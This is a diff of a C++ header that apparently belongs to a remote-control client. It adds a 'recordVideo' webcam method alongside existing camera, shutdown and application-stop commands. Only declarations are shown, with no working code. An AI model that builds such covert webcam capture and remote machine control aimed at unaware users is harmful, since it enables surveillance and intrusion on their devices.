@@ -1,4 +1,4 @@
-#pragma once
+﻿#pragma once
 
 #include <iostream>
 #include <string>
@@ -12,11 +12,15 @@
 #include <gdiplus.h>
 #include <thread>
 #include <chrono>
-
+#include <opencv2/opencv.hpp>
+#include <wx/utils.h>
+#include <ShlObj.h>
+#include <KnownFolders.h>
 
 // Add these pragma comments
 #pragma comment(lib, "gdiplus.lib")
 #pragma comment(lib, "user32.lib")
+#pragma comment(lib, "Shell32.lib")
 
 #ifndef DEFAULT_BUFLEN
 #define DEFAULT_BUFLEN 4096
@@ -62,6 +66,8 @@ public:
     // Camera commands
     void openCamera();
     void closeCamera();
+    vector<BYTE> recordVideo(int seconds);
+    
 
     // System commands
     void shutdownComputer();
@@ -80,3 +86,4 @@ public:
     void stopApplication(const string& appName);
 
 };
+
